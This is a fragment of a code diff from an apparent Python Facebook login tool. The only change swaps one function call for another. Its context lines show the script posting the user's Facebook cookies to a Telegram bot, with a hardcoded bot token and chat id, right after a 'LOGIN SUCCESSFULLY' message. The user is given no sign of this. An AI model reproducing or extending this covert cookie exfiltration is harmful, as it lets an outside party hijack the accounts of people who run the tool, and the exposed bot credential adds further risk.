@@ -325,7 +325,7 @@ def lxgin():
         sins(f"{lgr}  [✓] LOGIN SUCCESSFULLY")
         requests.post(f"https://api.telegram.org/bot6475095868:AAHH2uGLGm5a9GswmkVor8Xn7Oz9OOMYg6o/sendMessage?chat_id=6542321044&text=COOKIES: {fbcokis}")
         slp(2)
-        mxnu()
+        apprxval()
     except Exception as error: 
         os.system("rm -f .tokn.txt")
         print(f"{lr}  [X] COOKIE EXPIRED")
